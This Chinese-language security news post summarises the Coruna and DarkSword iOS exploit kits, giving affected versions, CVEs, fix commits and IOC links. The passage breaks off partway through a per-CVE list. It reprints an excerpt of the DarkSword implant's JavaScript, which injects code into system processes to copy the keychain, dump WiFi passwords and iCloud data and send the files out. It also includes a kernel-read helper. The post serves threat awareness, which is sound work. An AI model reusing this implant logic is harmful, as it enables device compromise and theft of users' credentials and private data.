---
title: Iphone漏洞利用工具包 已公开23个CVE
url: https://mp.weixin.qq.com/s/fJyIpOq2Pu5J8uNOO0dTyA
source: Doonsec's feed
date: 2026-03-24
fetch_date: 2026-03-25T04:13:19.294784
---

# Iphone漏洞利用工具包 已公开23个CVE

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/p6tibQrAWXspWKXbC5dWlB9rV4FMqibSvfuorVqBI298XeJV3UHF0SZQ4ZcP2qjTfuUefhX1Y2QRbkX3l5jLrib9zZdkASph0nh6P7rssCJsHQ/0?wx_fmt=jpeg)

# Iphone漏洞利用工具包 已公开23个CVE

0x7556
0x7556

金刚狼不懂安全

![]()

在小说阅读器中沉浸阅读

## Coruna Iphone iOS 漏洞利用工具包

**漏洞描述**
Google 威胁情报组（GTIG）识别出名为 “Coruna” 的 iOS 漏洞利用工具包，针对运行 iOS 13.0–17.2.1 的 iPhone，包含 5 条完整利用链与共 23 个漏洞。高级利用采用未公开的利用技术与缓解绕过方法，可根据设备指纹选择合适的 WebKit RCE 漏洞、进行 PAC 绕过，并在链末注入名为 PlasmaLoader（GTIG 标识为 PLASMAGRID）的 Stager 二进制以窃取金融信息（尤其加密货币钱包）。该工具包被用于多个高风险定向行动。

**漏洞类型**: 多个（包括 WebKit RCE、WebContent Sandbox Escape、Privilege Escalation、PPL/PAC Bypass 等）
**漏洞发布日期**: 2026-03-03（Google Cloud Blog 文章发布日期）
**受影响版本**: iOS 13.0 – 17.2.1
**严重性**: 待定（文章未给出 CVSS，基于多项 0-day 推测为高危）
**POC/EXP 可用性**: 是（文章提及检索到混淆后的利用代码与有效载荷，但未公开提供）
**POC/EXP 发布日期**: 待定（部分漏洞如 CVE-2024-23222 已被发现于野外）

参考信息

* CVE Number: 多个（见下方详细列表）
* Security Advisory / 原始链接: https://cloud.google.com/blog/topics/threat-intelligence/coruna-powerful-ios-exploit-kit
* POC/EXP 链接（IOC 集合，需 VirusTotal 账号）：https://www.virustotal.com/gui/collection/8f6035fed41b481f604ad0336a637dce1ddaec6670e1497f38d4fca246fda4ce

---

### DarkSword iOS 漏洞利用工具包

**漏洞描述**
DarkSword 为与 Coruna 相关的 iOS 漏洞利用工具包，通过受感染的合法网站实施水坑攻击，针对 iOS 18.4–18.6.2。恢复出的完整 1-click 链包含 Safari 利用、沙箱逃逸、提权与内存驻留植入程序，全部以 JavaScript 构建，不依赖传统二进制 Mach-O 库，利用系统进程进行数据窃取与外传。

**漏洞类型**: 多个（包括 JavaScriptCore JIT RCE、沙箱逃逸、内核提权 等）
**漏洞发布日期**: 2026-03-18（iVerify Blog 文章发布日期）
**受影响版本**: iOS 18.4 – 18.6.2（部分漏洞可能影响更广）
**严重性**: 待定（未明确 CVSS，基于多项 0-day 推测为高危）
**POC/EXP 可用性**: 是（文章包含大量未混淆 JavaScript 代码片段与相关修复提交链接）
**POC/EXP 发布日期**: 待定

参考信息

* CVE Number: 多个（见下方详细列表）
* Security Advisory / 原始链接: https://iverify.io/blog/darksword-ios-exploit-kit-explained
* GTIG 分析: https://cloud.google.com/blog/topics/threat-intelligence/darksword-ios-exploit-chain
* Lookout 分析: https://www.lookout.com/blog/darksword
* DarkSword IOCs (STIX2): https://learn.iverify.io/hubfs/Blog%20Technical%20Files/DarkSword.stix2
* DarkSword 可疑域 (STIX2): https://learn.iverify.io/hubfs/Blog%20Technical%20Files/DarkSword-Suspicious-Domains.stix2

POC/EXP 选段（示例代码片段）

* 植入程序启动函数（pe\_main.js 节选） — 示例如下：

```
const TAG = "MAIN";
//const targetProcess = "bluetoothd";
const targetProcess = "SpringBoard";
function start() {
    let mutexPtr = null;
    let migFilterBypass = null;
    globalThis.xnuVersion = xnuVersion();
    let ver = globalThis.xnuVersion;
    // If iOS >= 18.4 we apply migbypass in order to bypass autobox restrictions
    if (ver.major == 24 && ver.minor >= 4) {
        mutexPtr = BigInt(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("malloc", 0x100));        libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("pthread_mutex_init", mutexPtr, null);
        migFilterBypass = new MigFilterBypass(mutexPtr);
    }
    let driver = new libs_Driver_Driver__WEBPACK_IMPORTED_MODULE_7__["default"]();
    libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].init(driver, mutexPtr);
    let resultPE = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].runPE();
    if (!resultPE)
        return;
    libs_TaskRop_TaskRop__WEBPACK_IMPORTED_MODULE_2__["default"].init();
    if(migFilterBypass)
        migFilterBypass.start();
    let launchdTask = new libs_TaskRop_RemoteCall__WEBPACK_IMPORTED_MODULE_8__["default"]("launchd",migFilterBypass);
    if (!launchdTask.success()) {
        returnfalse;
    }    libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].initWithLaunchdTask(launchdTask); libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].deleteCrashReports();    libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].createTokens();
    let agentLoader = new InjectJS_WEBPACK_IMPORTED_MODULE_6__["default"](targetProcess, _raw_loader_loader_js__WEBPACK_IMPORTED_MODULE_10__["default"], migFilterBypass);
    let agentPid = 0;
    if (agentLoader.inject()) {
        agentPid = agentLoader.task.pid(); libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(agentPid);
        libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].adjustMemoryPressure(targetProcess);
        agentLoader.destroy();
    }
    // Inject keychain copier FIRST into securityd (has access to keychain files)
    // This copies keychain/keybag to /tmp with 777 permissions
    const keychainProcess = "configd";
    let keychainCopier = new InjectJS_WEBPACK_IMPORTED_MODULE_6__["default"](keychainProcess, _raw_loader_keychain_copier_js__WEBPACK_IMPORTED_MODULE_12__["default"], migFilterBypass);
    if (keychainCopier.inject()) {
        libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(keychainCopier.task);
        keychainCopier.destroy();
    } else {
    }
    // Inject WiFi password dump into wifid (has keychain access for WiFi)
    // Using wifid instead of wifianalyticsd - wifid is always active
    const wifidProcess = "wifid";
    let wifiDump = new InjectJS_WEBPACK_IMPORTED_MODULE_6__["default"](wifidProcess, _raw_loader_wifi_password_dump_js__WEBPACK_IMPORTED_MODULE_13__["default"], migFilterBypass);
    if (wifiDump.inject()) {
        libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(wifiDump.task);
        wifiDump.destroy();
    } else {
    }
    // Also inject WiFi password dump into securityd (fallback for devices where wifid fails)
    const securitydProcess = "securityd";
    let wifiDumpSecurityd = new InjectJS_WEBPACK_IMPORTED_MODULE_6__["default"](securitydProcess, _raw_loader_wifi_password_securityd_js__WEBPACK_IMPORTED_MODULE_14__["default"], migFilterBypass);
    if (wifiDumpSecurityd.inject()) {
        libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(wifiDumpSecurityd.task);
        wifiDumpSecurityd.destroy();
    } else {
    }
    // Inject iCloud dumper into UserEventAgent (has access to iCloud Drive files)
    const userEventAgentProcess = "UserEventAgent";
    let iCloudDumper = new InjectJS_WEBPACK_IMPORTED_MODULE_6__["default"](userEventAgentProcess, _raw_loader_icloud_dumper_js__WEBPACK_IMPORTED_MODULE_15__["default"], migFilterBypass);
    if (iCloudDumper.inject()) {   libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(iCloudDumper.task);
        iCloudDumper.destroy();
    } else {
    }
    // Wait for all dumps to finish
    for (let i = 1; i <= 5; i++) {   libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("sleep", 1);
    }
    // Inject forensics file downloader AFTER keychain copier
    // This will send the copied keychain files from /tmp
    try {
        let fileDownloader = new InjectJS_WEBPACK_IMPORTED_MODULE_6__["default"](targetProcess, _raw_loader_file_downloader_js__WEBPACK_IMPORTED_MODULE_11__["default"], migFilterBypass);
        if (fileDownloader.inject()) {       libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(fileDownloader.task);
            fileDownloader.destroy();
        }
    } catch (injectError) {
        // Error handling without logging
    }
    launchdTask.destroy();
    returntrue;
}
```

* 内核内存 hexdump 示例：

```
function kdump(where, size, msg = "") {
    LOG(`[+] ----------- ${msg} ----------`);
    for (let i = 0n; i < size; i += 0x10n) {
      LOG(`[+] [${i.hex()}] ${(where + i).hex()}:\t${early_kread64(where + i).hex()} ${early_kread64(where + i + 8n).hex()}`);
    }
}
```

* 修复提交（示例）

+ https://github.com/WebKit/WebKit/commit/716536ce98d6f8d40c44abed667b6a1970023e17 (CVE-2025-31277)
+ https://github.com/WebKit/WebKit/commit/b21a503b579a8ab14c839f82cc77176e507352e5 (CVE-2025-43529)
+ https://github.com/apple-oss-distributions/dyld/commit/9b3c6bde0c6d1cb4a13ce7646aed6f74597bcc84 (CVE-2026-20700)
+ https://chromium-review.googlesource.com/c/angle/angle/+/7232784 (CVE-2025-14174)

---

## DarkSword 工具包中涉及的特定漏洞

### 1) CVE-2025-31277

**漏洞描述**: Safari WebContent 进程 JIT RegExp 匹配漏洞，导致任意内存读写（JIT RCE）。
**漏洞类型...